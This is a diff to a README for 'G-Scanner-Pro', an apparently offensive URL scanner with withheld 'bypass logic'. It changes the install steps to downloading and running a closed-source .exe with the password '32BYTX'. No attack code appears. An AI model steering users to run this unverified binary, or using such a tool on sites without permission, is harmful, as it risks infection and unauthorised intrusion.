@@ -31,11 +31,13 @@ Since the source code is not public to prevent misuse of the bypass logic, you c
 
 1.  **Go to the [Releases](https://github.com/32BYTX/G-Scanner-Pro/releases/tag/v1.0.0) page.**
     
-2.  **Download the latest `G-Scanner-Pro.zip`.**
+2.  **Download the latest `G-Scanner-Pro.exe`.**
     
-3.  **Extract the folder and run `G-Scanner-Pro.exe`.**
-    
-4.  **Load your URL list (.txt) and hit Start.**
+3.  **run `G-Scanner-Pro.exe`.**
+
+4.  **PASSWORD `32BYTX`.**
+
+5.  **Load your URL list (.txt) and hit Start.**
     
 
 ## ⚖️ Legal Disclaimer
